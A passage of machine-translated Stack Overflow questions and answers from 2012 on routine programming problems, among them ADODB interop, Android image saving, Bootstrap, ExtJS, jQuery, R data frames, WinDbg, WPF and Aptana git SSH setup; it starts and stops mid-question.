那么，有人知道我做错了什么吗？在 C# 中，我尝试从 .NET 选项卡和 COM 选项卡中引用 ADODB（我从 COM 选项卡中选择的 ADO 版本是正确的：2.5...再次，不要问），但仍然没有喜悦。

**编辑**

当我尝试将 RecordSet 的 ActiveConnection 属性分配给来自 C# 的连接时，会发生完全相同的事情，如下所示：

```
Dim rs As New ADODB.Recordset
Set rs.ActiveConnection = theAdoConnectionComingFromDotNet 
```

由于 ActiveConnection 是一个变体，我能想到的另一个解决方法是将其设置为连接的 ConnectionString 属性。这行得通，但它每次都会创建并打开一个新连接，坦率地说我不喜欢它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T18:11:23.607

这似乎是错误的方式，但这与我遇到的问题非常相似——ADO 停止在一个 COM 对象中工作，该对象在 Win7 机器上重新编译然后在 XP 机器上使用——我认为这可能是同一件事. 即，[破坏 COM 对象中的 MDAC ADO](http://social.msdn.microsoft.com/Forums/en/windowsgeneraldevelopmentissues/thread/3a4ce946-effa-4f77-98a6-34f11c6b5a13)的灾难性 Windows 更新（非常长的线程，预计加载缓慢）。如果是这样，可以[在这里找到](http://support.microsoft.com/kb/2640696)官方修复。

如果不是这样并且您找不到解决方案，我认为您最好的做法是仅使用您在编辑中提到的连接字符串解决方法。这并不理想，但您说无论如何您都将开始重写 DLL，因此这只是临时安排。

# eclipse-plugin - 新项目向导插件

> ID：10597743
> 
> 赞同：0
> 
> 时间：2012-05-15T09:21:50.730
> 
> 标签：eclipse-plugin

我需要创建一个执行以下操作的 Eclipse 项目：在 File->New->Project 列表中添加一个条目 b. 当用户单击此弹出窗口时，我会在其中询问一些信息 c。单击确定后，我想生成实现某些接口的 java 代码

我知道如何执行步骤 a 和 b。我如何生成才能实现步骤 c？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:43:15.963

假设您不仅需要 Java 代码，还需要整个 Java 项目：这里有一个很好的教程：http://sdqweb.ipd.kit.edu/wiki/JDT_Tutorial: [_Creating_Eclipse_Java_Projects_Programmatically](http://sdqweb.ipd.kit.edu/wiki/JDT_Tutorial:_Creating_Eclipse_Java_Projects_Programmatically)

# android - 捕获图像并保存到 ImageView 的问题

> ID：10597744
> 
> 赞同：0
> 
> 时间：2012-05-15T09:21:51.280
> 
> 标签：android

> **可能重复：**
> [从相机捕获图像并在活动中显示](https://stackoverflow.com/questions/5991319/capture-image-from-camera-and-display-in-activity)

我是android编程的新手，我遇到了一些问题。我有一个 ImageView 没有加载任何图像，当我用相机拍照时，捕获的图像会放入 ImageView。我想保存这个，但我不知道如何将照片的目录保存在字符串中，以及如何在“onCreate”的 imageView 中加载这个目录。

我知道这是一个菜鸟提示，但这是我第一次使用这些东西。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:28:23.967

此代码会将您的 ImageView 作为位图

```
ImageView imgView = (ImageView) findViewById(R.id.myImageView);
imgView.setDrawingCacheEnabled(true);
bitmap = Bitmap.createBitmap(imgView.getDrawingCache());

File root = Environment.getExternalStorageDirectory();
File cachePath = new File(root.getAbsolutePath() + "/your_app_package/image.png"); 
```

此代码会将其保存到文件中

```
try {
       FileOutputStream out = new FileOutputStream(cachePath);
       bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
} catch (Exception e) {
       e.printStackTrace();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:29:08.963

我做这样的事情：

```
ByteArrayOutputStream bytes = new ByteArrayOutputStream();
picture.compress(Bitmap.CompressFormat.JPEG, 80, bytes);

File f = new File(Environment.getExternalStorageDirectory() + File.separator + picId + ".jpg");
FileOutputStream fo = null;
try 
{
    f.createNewFile();
    fo = new FileOutputStream(f);
} 
catch (IOException e) 
{
    e.printStackTrace();
}
catch (FileNotFoundException e) 
{
    e.printStackTrace();
}

try 
{
    fo.write(bytes.toByteArray());
} 
catch (IOException e) 
{
    e.printStackTrace();
} 
```

...其中 picId 是文件的名称。

# ruby-on-rails - Twitter引导导航崩溃

> ID：10597747
> 
> 赞同：3
> 
> 时间：2012-05-15T09:21:52.597
> 
> 标签：ruby-on-rails, twitter-bootstrap

这就是我的代码的样子，但问题是：**当我单击折叠按钮（具有 4 条水平线的按钮）时，它不会在第一次单击时打开，而只会在第二次单击时打开。**第一次点击什么都不做，第二次打开它很快，然后很快关闭它，然后再次重新打开它。为什么会这样以及如何解决？

```
 22     <!-- BOOTSTRAP NAVBAR -->
 23     <div class="navbar navbar-fixed-top">
 24       <div class="navbar-inner">        
 25         <div class="container">
 26 
 27           <a class="btn btn-navbar" data-target=".nav-collapse" data-toggle="collapse">                                                   
 28             <span class="icon-bar"></span>  
 29             <span class="icon-bar"></span>  
 30             <span class="icon-bar"></span>  
 31             <span class="icon-bar"></span>
 32           </a>
 33     
 34           <%= link_to 'Synergy', root_path, :class => 'brand' %>                                                                          
 35 
 36           <div class="nav-collapse">                                                                                            
 37 
 38             <% if current_user %>                                                                                                         
 39 
 40               <ul class="nav">
 41                 <li><%= link_to 'My projects', projects_path %></li>
 42                 <li><%= link_to current_user.name, '#' %></li>
 43                 <li><%= link_to 'Log out', destroy_user_session_path, :method => :delete %></li>
 44               </ul>        
 45 
 46             <% else %>     
 47 
 48               <ul class="nav">
 49                 <li><%= link_to 'Sign in', new_user_session_path %></li>
 50                 <li><%= link_to 'Sign up!', new_user_registration_path %></li>
 51               </ul>        
 52 
 53             <% end %>      
 54 
 55           </div>           
 56 
 57         </div>             
 58       </div>               
 59     </div>
 60     <!-- BOOTSTRAP NAVBAR --> 
```

编辑：这是我的 application.js 文件：

```
 13 //= require jquery
 14 //= require jquery_ujs
 15 //= require jquery-ui
 16 //= require twitter/bootstrap
 17 //= require_tree . 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-19T16:03:32.197

听起来您正在双重加载一些 JS 文件。在 Ruby 或 Grails 等环境中，很容易忘记文件加载的位置。

尝试在页面脚本中包含对 Jquery 的调用，并在调用之后直接放置一个内联脚本。一个例子是这样的：

```
<script src="js/jquery.js" type="text/javascript"></script>
<script src="js/bootstrap-carousel.js" type="text/javascript"></script>
<script src="js/bootstrap-transition.js" type="text/javascript"></script>
<script>

$(document).ready(function() {
    $('#myCarousel').carousel();
  });
</script> 
```

添加此脚本后，检查 Firebug 或其他开发人员工具中的 Web 控制台。您应该查看 jQuery 是否正确加载或多次加载。让我知道这是否解决了问题:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-03T23:33:13.647

就我而言，发生了类似的事情，因为我之前已经为生产预编译了我的资产，并且 dev 和 prod js 资产都在运行。

`rake assets:clean`(rails3) / `rake assets:clobber`(rails4) 修复了这个问题。

# iphone - 如何在iphone中发送格式化文本

> ID：10597751
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:22:14.000
> 
> 标签：iphone, ipad

我正在开发一个具有许多控件来格式化文本的应用程序。
这些控件就像颜色、字体样式、边框、为文本提供背景，甚至动画。

我的问题是我可以通过 SMS 和 MMS 将这种格式化文本发送给我的朋友吗？苹果支持吗？
请给我任何链接或任何参考，我可以在其中研究并在我的项目中实施它。

提前谢谢....

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:28:31.393

据我所知这是不可能的，我在商店里看到了很多这样的应用程序，基本上只是保存为图片并作为图片发送。

截至目前... SDK`MFMessageComposeViewController`中不支持彩信。

虽然您可以渲染图像并发送它。

他们是如何做到的呢？？？？

他们可能会向他们的服务器发送一个请求，从那里发送一个 mms？

以下是一些选项：

这在当前 MessageUI API 中是不可能的：MSMessageComposeViewController 不像 MFMailComposeViewController 那样接受附件。

目前唯一的方法是使用外部服务，例如，允许您通过 REST 调用发送彩信。

GSMA 专门为此目的定义了 REST 规范：[http](http://www.gsmworld.com/oneapi/reference_documentation-version_1.html) ://www.gsmworld.com/oneapi/reference_documentation-version_1.html （此页面上有多个 pdf）

尝试找到实现此规范的本地服务提供商，您就可以开始了。

只需将直接 wiki 链接添加到 OneAPI MMS 规范：[http://gsma.securespsite.com/access/Access%20API%20Wiki/MMS%20RESTful%20API.aspx](http://gsma.securespsite.com/access/Access%20API%20Wiki/MMS%20RESTful%20API.aspx)和 PHP/Java 沙箱链接[https:// /github.com/OneAPI/GSMA-OneAPI](https://github.com/OneAPI/GSMA-OneAPI)可以在本地测试彩信。干杯。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:31:32.700

Apple 仅支持发送[`SMS`](http://en.wikipedia.org/wiki/SMS)短信，使用[`MFMessageComposeViewController`](http://developer.apple.com/library/ios/#DOCUMENTATION/MessageUI/Reference/MFMessageComposeViewController_class/Reference/Reference.html).

由于短信只支持发送纯文本，因此您无法设置任何格式。

`MFMessageComposeViewController`不支持[`MMS`](http://en.wikipedia.org/wiki/Multimedia_Messaging_Service)，这将允许您发送格式化的消息。

# asp.net-mvc-3 - MVC3 WebGrid - @Url.Action 使用图像按钮

> ID：10597762
> 
> 赞同：0
> 
> 时间：2012-05-15T09:23:13.900
> 
> 标签：asp.net-mvc-3

我遇到了一个实际上我还没有解决的问题。由于某些原因，我请求将 Html.ActionLink 中使用的文本替换为更直观的设计，使用图像作为 WebGrid 内的按钮，用于修改、复制、发布和删除等常规操作。阅读我尝试了很多方法，但没有一个使我进入最后阶段：

```
@{
    var grid = new WebGrid(Model, new List<string>(), canPage: true, rowsPerPage: 5);
    grid.Pager(WebGridPagerModes.NextPrevious);
        @grid.GetHtml(tableStyle: "webGrid",
        htmlAttributes: new { id = "DataTable" },
        headerStyle: "header",
        alternatingRowStyle: "alt",
        columns:
        grid.Columns(
        grid.Column("Description", header: "Description"),
        grid.Column("DateCreation", header: "Creation Date"),
        grid.Column("CompanyOwner", header: "Company"),
        grid.Column("Owner", header: "User"),
        grid.Column("Status", header: "Status"),
        grid.Column("Action", header: "Action", 
                          format: (item) => @Url.Action("publish", 
                                                        "PublishItem",  
                                                        new { id = item.ID })))
        );
    } 
```

为此，我从一个使用 linq 到实体创建的模型开始，我在其中添加了 Action 列，我想用它来放置我的按钮。如何像在普通表格中一样将图像放置为按钮：

```
<a href="@Url.Action("PublishPill", new { id = item.ID })">
<img src="../../Images/world_32px.png", alt="Edit" title="Publish" border="0" /></a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T20:47:14.743

您可以使用

`grid.Column(header: "Contraseña", format: @<text><a href="@Url.Action("ChangePassword", "Home", new { id = item.Identification })" ><img src="../../Content/images/password.png" alt="" style="border:none;" /></a></text>, style: "colOperation")`

# drupal - 完整 HTML 中的模板 drupal

> ID：10597763
> 
> 赞同：1
> 
> 时间：2012-05-15T09:23:15.070
> 
> 标签：drupal, drupal-modules, drupal-theming, newsletter, drupal-templates

有没有办法为不导入标签和标签开头的内容类型构建drupal模板？

例如，我将创建一个基于“page--newsletter.tpl.php”的“newsletter”内容类型，如下所示：http: [//drupal.org/node/1089656](http://drupal.org/node/1089656) 但是所有的 xxx.tpl。我见过的 php 不包含 HTML 代码的顶部

有办法吗？

**编辑：**当 $node->type 等于“newsletter”时，我试图将 html.tpl.php 更改为另一个（看起来更容易）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T13:10:10.007

```
function themename_preprocess_html(&$vars, $hook) {
  if ($node = menu_get_object()) {
    array_splice($vars['theme_hook_suggestions'], -1, 0, 'html__' . str_replace('-', '_', $node->type));
  }
  #print_r($vars['theme_hook_suggestions']); // print out suggestions
} 
```

# extjs - 在 ExtJS 中编写自定义阅读器

> ID：10597768
> 
> 赞同：2
> 
> 时间：2012-05-15T09:23:36.987
> 
> 标签：extjs, extjs4

我是 ExtJS 的新手并且正在使用它，我正在从服务器接收以下 JSON，如下所示

```
{"tid":1,"action":"HelloWorld","method":"getData",
  "result": {"InstId":"1",
    "value":  [
  {"country.stateId":"101", "country.stateName":"TA"},
  {"country.stateId":"102", "country.stateName":"ABC"}, 
  {"country.stateId":"103", "country.stateName":"DEF"}]}",
                  "type":"rpc"} 
```

我需要从上面的 JSON 中提取值并填充组合框。要完成这项工作，我需要编写一个自定义阅读器来读取和填充组合框中的内容。你们中的任何人都可以帮我写一个自定义阅读器吗？

以下是各种片段

```
Ext.define('AM.store.TestStore', {

  extend: 'Ext.data.Store',

  alias : 'widget.testStore',
  model: 'AM.model.TestModel',
  autoload:true,
  proxy: {
      type: 'direct',

      directFn: HelloWorld.getData,
      extraParams:[ {'InstId': '1', 'boxid':'id'},
                    {'InstId': '1', 'name':'states'}
   ],

   reader:{
         type:'json',
         root:'result'

  }
  }); 
```

以下是视图对象

```
Ext.define('AM.view.combobox.TestView' ,{
    extend: 'Ext.form.ComboBox',
    alias : 'widget.TestView',
    fieldLabel: 'States',
    store:'TestStore',
    renderTo: Ext.getBody(),
    displayField: 'country.stateName',
    valueField: 'country.stateId',
    autoselect:false

}); 
```

以下是我的模型对象

```
Ext.define('AM.model.TestModel', {
    extend: 'Ext.data.Model',

    alias : 'widget.TestModel',
    fields: [ {name: 'country.stateId'}, {name: 'country.stateName'}]
); 
```

以下是我的控制器

```
Ext.define('AM.controller.Funds', {
     extend: 'Ext.app.Controller',
     alias : 'widget.FundsController',
     views: ['combobox.TestView'],
     stores: ['TestStore'],
     models:['TestModel']
); 
```

谁能帮我写一个自定义的 JSON 阅读器？

谢谢帕尼库马尔
_

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T10:33:18.043

您不需要为此编写*自定义*阅读器。我认为对您的代码进行一些小的更改就足够了：

首先，在代理定义中：

```
root: 'value'
useSimpleAccessors: true 
```

然后在模型中为您的数据：

```
fields: [{
    name: 'id', mapping: 'country.stateId' }, {
    name: 'name', mapping: 'country.stateName' 
}] 
```

那应该这样做。

# jquery - 如何使用jquery设置顶部位置

> ID：10597769
> 
> 赞同：71
> 
> 时间：2012-05-15T09:23:39.450
> 
> 标签：jquery

我正在创建自定义 div 滚动条并希望设置内容 div 的顶部位置。我的jQuery代码如下：

```
containerOuterHeight=$("#messagePopUpContainer").outerHeight();
            contentOuterHeight=$("#content").outerHeight();
            contentTopPosition=$("#content").offset().top;
            alert("contentTopPosition"+contentTopPosition);
            alert(contentTopPosition-(containerOuterHeight/20));
            $("#content").offset().top=contentTopPosition-(containerOuterHeight/20);
            //$("#content").css("top",( contentTopPosition-(containerOuterHeight/20) ) + "px");
            alert("contentTopPosition"+$("#content").offset().top);
            //alert("Fontsize"+$('#content').css('font-size') ); 
```

和html是：

```
<div id='messagePopUpContainer' style='background-color:#ffffff; overflow: hidden;'>
<a href='javascript:void(0);' id='popupanchor' onkeydown='PopupKeyHandler("' + elmId + '");'></a> 
```

```
<div id='content' style='width:350px'>' + methods.settings[elmId].text + '</div >
<div id='popupReturn'>Return</div></div></div>' 
```

* * *

## 回答 #1

> 赞同：145
> 
> 时间：2012-05-15T09:28:03.793

您可以使用 CSS 来解决问题：

```
$("#yourElement").css({ top: '100px' }); 
```

* * *

## 回答 #2

> 赞同：68
> 
> 时间：2012-05-15T09:29:21.890

[使用.css()](http://api.jquery.com/css/)访问 CSS 属性和操作非常容易。例如，要更改单个属性：

```
$("selector").css('top', '50px'); 
```

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2014-12-11T16:34:04.380

你也可以做

```
 var x = $('#element').height();   // or any changing value

   $('selector').css({'top' : x + 'px'}); 
```

或者

你可以直接使用

```
$('#element').css( "height" ) 
```

`.css( "height" )`和之间的区别在于`.height()`后者返回一个无单位的像素值（例如，`400`），而前者返回一个具有完整单位的值（例如，`400px`）。当需要在数学计算中使用元素的高度时，建议使用 .height() 方法。[jQuery文档](http://api.jquery.com/height/)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-12-14T05:14:05.620

仅供参考，如果您使用的是：

```
 $(el).offset().top 
```

要获取位置，可能会受到父元素位置的影响。因此，您可能希望保持一致并使用以下内容进行设置：

```
$(el).offset({top: pos}); 
```

与上面的 CSS 方法相反。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-11-29T21:23:18.337

并使用**原型**：

```
$('yourDivId').setStyle({top: '100px', left:'80px'}); 
```

# r - data.frame 中的发生计数

> ID：10597772
> 
> 赞同：1
> 
> 时间：2012-05-15T09:23:52.417
> 
> 标签：r

我有一个这样的数据框：

> ```
>  G1  G2  G3
>   a   b   f
>   b   c   a
>   c   d   b 
> ```
> 
> > 和参考列表： L: a b c d e f

我想要以下输出：

> ```
> a: 2, G1,G3   (that is "a" occurs two times in G1 and in G3 column)
> b: 3, G1,G2,G3
> c: 2, G1,G2 
> ```

等等..有人可以帮助我吗？很抱歉打扰你，但我是 R 的新手，提前谢谢。

埃莱奥诺拉

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:50:10.803

你可以这样做：

```
r <- reshape(d,varying=list(colnames(d)),direction='long',
             v.names='value',times=colnames(d),timevar='colname')

res <- by(r,r$value,FUN=function(x){unique(x$colname)})

> res

r$value: a
[1] "G1" "G3"
------------------------------------------------------------ 
r$value: b
[1] "G1" "G2" "G3"
------------------------------------------------------------ 
r$value: c
[1] "G1" "G2"
------------------------------------------------------------ 
r$value: d
[1] "G2"
------------------------------------------------------------ 
r$value: f
[1] "G3" 
```

基本上`res`是一个包含每个字母的列表，该字母出现的列名向量，例如：

```
res$a : 'G1', 'G3'
res$b : 'G1', 'G2', 'G3'
... 
```

如果您只想要出现次数，您可以执行以下操作：

```
> lapply(res,length)
$a
[1] 2

$b
[1] 3

$c
[1] 2

$d
[1] 1

$f
[1] 1 
```

**编辑：**
要写入`res`文件，一种方法可能如下：

```
# prepare the table (data.frame) to be written
dF <- do.call(rbind.data.frame, lapply(res,function(x){list(Occur=length(x),Columns=paste(x,collapse=' '))}))
dF <- cbind(Letter=row.names(dF),dF)
# write the table to file
write.table(dF,row.names=FALSE,sep=',',file='myfile.csv') 
```

文件文本：

```
"Letter","Occur","Columns"
"a",2,"G1 G3"
"b",3,"G1 G2 G3"
"c",2,"G1 G2"
"d",1,"G2"
"f",1,"G3" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T10:50:57.140

我以另一种方式尝试过。

```
A=data.frame( G1=c("a","b","c"),  G2=c("b","c","d"),  G3=c("f","a","b"))

B= melt(as.matrix(A))
B$X2 =as.character(B$X2)
B1=table(as.matrix(A))
D=aggregate(X2~value , B, FUN=c)
D$cnt=B1[D$value]
D 
```

输出是

```
 value         X2 cnt
1     a     G1, G3   2
2     b G1, G2, G3   3
3     c     G1, G2   2
4     d         G2   1
5     f         G3   1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T13:05:19.310

这两种方法都已经很好地工作了。只是想我会给出一些不同的方法来解决类似的问题。

```
#Vinux's data:
A=data.frame( G1=c("a","b","c"),  G2=c("b","c","d"),  G3=c("f","a","b"))

B <- data.frame(x=rep(colnames(A), sapply(A, length)),        #means of reshaping data
    y=c(apply(A, 2, as.character)))
C <- split(B$x, B$y)                                          #column names by value
D <- data.frame(letter=names(C), occurance=sapply(C, length)) #get occurrences
D$column <- sapply(C, as.character)                           #force vector of vectors
D[, c(1, 3, 2), ]                                             #order it 
```

产生：

```
 letter     column occurance
a      a     G1, G3         2
b      b G1, G2, G3         3
c      c     G1, G2         2
d      d         G2         1
f      f         G3         1 
```

# c# - 让 SQL 在特定的入站端口范围客户端上运行

> ID：10597774
> 
> 赞同：0
> 
> 时间：2012-05-15T09:23:56.027
> 
> 标签：c#, .net, sql, clickonce, firewall

我有一个问题，我正在编写的应用程序（使用 C# 用 .net 编写）在进行 SQL 连接时开始被防火墙阻止，原因似乎是入站端口客户端正在进入一个很大的范围，即防火墙不允许（大约端口 50,000 - 60,000）。

有没有办法让 SQL 连接在特定的入站端口范围客户端上运行，以便可以将这个较小的端口范围作为例外添加到客户端防火墙？服务器使用 Microsoft SQL Server 2008。

我知道一种解决方案是将应用程序本身添加到防火墙，但公司使用的部署方法是单击一次，当它更新时，它会更改已安装程序的目录，这意味着管理员必须每次更新每个客户端的防火墙进行了更新。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:48:23.433

正如我在评论中指出的（在此引用我自己），您可能需要考虑在 Web 服务中移动查询，并让它为您提供数据（它将部署在特定的、众所周知的端口上，因此您会好的）。

关于这个主题的更多信息：我**强烈**建议您*永远不要*让外部世界进入您的公司数据库，这是一个很大的安全问题。

# .net - Windows 7 x64 上的 WinDbg x86 .NET 4 应用程序：无法加载数据访问 DLL，0x80004005

> ID：10597779
> 
> 赞同：2
> 
> 时间：2012-05-15T09:24:32.167
> 
> 标签：.net, windbg

我正在尝试在 Windows 7 x64 上使用 WinDbg 调试 .NET 4 32 位（在项目选项中明确设置）应用程序，步骤如下：

*   启动我的应用程序（让它成为 foo.exe）
*   在windbg.exe上启动x86版本
*   附加到 foo.exe
*   .loadby sos clr
*   !dumpheap -stat

之后我得到这个：

```
Failed to load data access DLL, 0x80004005
Verify that 1) you have a recent build of the debugger (6.2.14 or newer)
            2) the file mscordacwks.dll that matches your version of clr.dll is 
                in the version directory
            3) or, if you are debugging a dump file, verify that the file 
                mscordacwks_<arch>_<arch>_<version>.dll is on your symbol path.
            4) you are debugging on the same architecture as the dump file.
                For example, an IA64 dump file must be debugged on an IA64
                machine. 
```

怎么了？我搜索了很多..这个问题看起来是关于内存转储的：[无法加载数据访问 DLL，0x80004005](https://stackoverflow.com/questions/1920712/failed-to-load-data-access-dll-0x80004005) 但我正在尝试调试正在运行的应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-16T15:12:21.353

DAC 是 SOS 用来与托管运行时对话的层。如果由于某种原因无法找到正确的版本（或者如果您的调试器已过时），您将看到此消息。如果您执行 a `.cordll -ve -u -l`，您将获得有关它正在尝试加载的版本的更多信息，并且您应该能够从那里进行故障排除。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T10:18:44.430

最后，我使用 Visual Studio 即时窗口而不是 WinDbg 来调用 SOS 函数（dumpheap 等）：http: [//msdn.microsoft.com/en-us/library/bb190764.aspx](http://msdn.microsoft.com/en-us/library/bb190764.aspx)

# c# - WPF 应用程序中的模态消息框

> ID：10597783
> 
> 赞同：6
> 
> 时间：2012-05-15T09:24:36.127
> 
> 标签：c#, wpf, messagebox

我试图在我的应用程序中将标准 MessageBox 显示为模式窗口，但它最终成为非模式窗口。在第一次调用中，在下面的代码中，我展示了一个标准的 MessageBox，它应该是模态的。在第二次调用中，即使我抓住主窗口调度程序，它也不会显示为模式。

```
Dispatcher disp = Application.Current.MainWindow.Dispatcher;
//First call, shown MODAL
if (this.messageService.ShowYesNo("Do you want to update the Word document, this will regenerate inspectiondata for document", "") == MessageBoxResult.Yes)
{
    using (new WaitCursor())
    {
        _eventAggregator.GetEvent<ProgressBarRequestShow>().Publish("");
        worker = new BackgroundWorker();

        worker.DoWork += delegate(object s, DoWorkEventArgs args)
        {
            AITUpdateProgressDelegate update = new AITUpdateProgressDelegate(UpdateProgress);
            this.docService.UpdateWorddocument(this.docService.GetCurrentDocumentFilePath, update);
        };

        worker.RunWorkerCompleted += delegate(object s, RunWorkerCompletedEventArgs args)
        {
            try
            {
                // Second call NOT MODAL
                disp.Invoke((Action)delegate()
                {
                    this.messageService.ShowInformation("Document generated, choose Open in Word in main toolbar to show document", "");
                });
                _eventAggregator.GetEvent<ProgressBarRequestHide>().Publish("");
            }
            finally
            {
            }
        };
        worker.RunWorkerAsync();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T11:40:12.873

[这](http://blogs.microsoft.co.il/blogs/arik/archive/2011/05/26/a-customizable-wpf-messagebox.aspx)看起来像您正在寻找的东西。对消息框的调用包括一个“所有者”参数。我在以前做过的代码中使用了类似的概念，并将窗口显示为模态。示例代码也可以从链接下载。

# database - WSO2 身份服务器与 LDAP 和 DB 的集成

> ID：10597785
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:24:46.840
> 
> 标签：database, ldap, wso2, integration, wso2is

刚刚查询了 WSO2 Identity Server 是否可以同时与 LDAP 和 DB 集成。为了详细说明我的查询，假设我们在 LDAP 中定义了一组用户，在 DB 中定义了另一组用户，我希望 Identity Server 充当这两个组的授权网关。可能吗？

此外，在与 DB 集成的同时，WSO2 在我们现有的 DB 中添加了自己的表。有什么方法可以在不更改 WSO2 表的情况下在 DB 中添加自定义属性（声明）支持？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T12:29:02.577

WSO2 Identity Server 在给定时间仅支持一个活动用户领域。但是，如果您的要求是使用 WSO2 IS 作为授权网关，它连接到 LDAP 服务器以及用于填充声明的数据库等，那么可以在 WSO2 IS 中使用 XACML 支持和自定义 PIP（策略信息点）。在这种情况下，您可以连接到 LDAP 服务器作为主要用户存储并编写自定义 PIP 以连接到数据库以读取所需的声明。

以下两篇关于 PIP 的帖子会有所帮助。

[1] - [http://xacmlinfo.com/2011/12/18/understanding-pip/](http://xacmlinfo.com/2011/12/18/understanding-pip/) [2] - [http://blog.facilelogin.com/2011/04/xacml-policy-information-point.html](http://blog.facilelogin.com/2011/04/xacml-policy-information-point.html)

回答第二个查询，使用 JDBC 模式的默认配置，WSO2 IS 使用它自己的一组表来维护它的用户存储。但是如果需要，您可以编写自己的用户存储实现来连接到您的数据库。

# git - 如何让 Aptana Studio 记住 git ssh 密码

> ID：10597789
> 
> 赞同：8
> 
> 时间：2012-05-15T09:24:56.347
> 
> 标签：git, aptana

我找不到任何有关如何获得 Aptana Studio 的内置 git 支持以记住用于执行推/拉操作的 ssh 密码的指南/信息。

有人有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-16T02:08:53.520

在 Linux 上，我的 ssh 配置文件 ( ~/.ssh/config ) 如下

```
Host github.com
    User MyUsername
    IdentityFile=/home/MyUsername/.ssh/MySshKey` 
```

如果您有带密码的密钥，则需要 ssh-agent 或其他应用程序之类的东西，因此您只需输入一次密钥密码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-06T09:48:41.040

> Aptana Studio，实际上是它的内置 GIT 程序，将在 Windows 上的 C:\Users\UserName.ssh 文件夹中查找您的 SSH 密钥。

不！。真正的路径是

%HOME%\.ssh\id_rsa --> 对于 RSA 密钥，如果您的密钥是 DSA，请更改前缀

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T10:39:50.317

您需要确保 Aptana 要求输入密码，因为：

*   您的私钥已找到并受密码保护
*   或者因为根本没有找到 SSH 密钥（并且 SSH 默认返回普通身份验证）

它还取决于您使用的 SSH exe，正如该[线程所述](https://aptanastudio.tenderapp.com/discussions/questions/676-git-in-aptana-studio-3-fails-to-recognize-ssh-key)：

> Aptana Studio 将`GIT_SSH`环境变量设置为其内部程序，该程序在常见情况下处理 SSH 密码/密码提示。
> 如果您通过设置来替换默认`ssh.exe`可执行文件，要使用 Aptana Studio，您还需要设置为相同的路径。`GIT_SSH``plink.exe``SSH_CMD``plink.exe`

[默认情况下，Aptana 使用](https://aptanastudio.tenderapp.com/discussions/problems/2772-aptana-cannot-use-git-commands-with-team-conext-menu-but-works-with-terminal#comment_9512008)：

```
[path_to_aptana_studio]/plugins/com.aptana.git.core_[version]/os/win32/sshw.exe 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T09:41:24.053

Aptana Studio，实际上是它的内置 GIT 程序，将在 Windows 上的 C:\Users\UserName.ssh 文件夹中查找您的 SSH 密钥。

看看这个键是否工作。首先，服务器必须具有您的公钥，并且您设置了正确的存储库远程路径。然后尝试一个普通的 ssh 用户名@host，如果你可以使用 ssh 关键字登录，你应该能够开始使用 git 到远程。

为了能够不必每次连接到远程时都输入 ssh 关键字，您可能没有 ssh 关键字。

[SSH无密码登录](http://www.linuxproblem.org/art_9.html)

或者您需要一些额外的程序来保存密码并为您输入密码。一个所谓的 ssh 代理。

[将 ssh-agent 与 ssh 一起使用](http://mah.everybody.org/docs/ssh)

也许如果您安装[Egit](http://www.eclipse.org/egit/)并使用它而不是 Aptanas Git。它可能会保存您的 ssh 关键字。（未验证！）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-06-05T16:00:34.070

超级简单的方法就是在您导入 git 存储库时将其包含在 url 中。

```
EG: https://UserName:Password@www.yourserver.com/repo.git 
```

当然，您只想将此技巧与 https 网址一起使用。

# pdf - word自动另存为pdf

> ID：10597795
> 
> 赞同：1
> 
> 时间：2012-05-15T09:25:10.657
> 
> 标签：pdf, converter, doc, word-automation

在 MS Word 2010 中将文档另存为 pdf 时，我们会获得其他选项，例如“优化”。这些选项在 c# 中不能设置为 Document.Saveas 函数的参数。请告诉我如何在保存 pdf 之前设置这些选项。

```
Document doc = word.Documents.Open(ref filename, ref oFalse, ref oTrue, ref oFalse, "?#nonsense@$", "?#nonsense@$", ref oTrue, ref oMissing, ref oMissing, ref oMissing, ref oMissing, ref oFalse, ref oFalse, WdDocumentDirection.wdLeftToRight, ref oTrue);
doc.Activate();
object outputFileName = wordFile.FullName.Replace(".docx", ".pdf");
object fileFormat = WdSaveFormat.wdFormatPDF;
// Save document into PDF Format
doc.SaveAs(ref outputFileName, ref fileFormat, ref oMissing, ref oMissing, ref oMissing, ref oMissing, ref oMissing, ref oFalse); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T14:32:11.667

[Document.ExportAsFixedFormat](http://msdn.microsoft.com/en-us/library/bb256835%28v=office.12%29.aspx)中的 OptimizeFor 参数将满足您的需要

# jquery - jquery 工具覆盖 - 奇怪的加载错误

> ID：10597798
> 
> 赞同：0
> 
> 时间：2012-05-15T09:25:23.090
> 
> 标签：jquery, jquery-tools

我正在尝试让 jQuery 工具覆盖工作。问题是它只加载某种 ASCII。

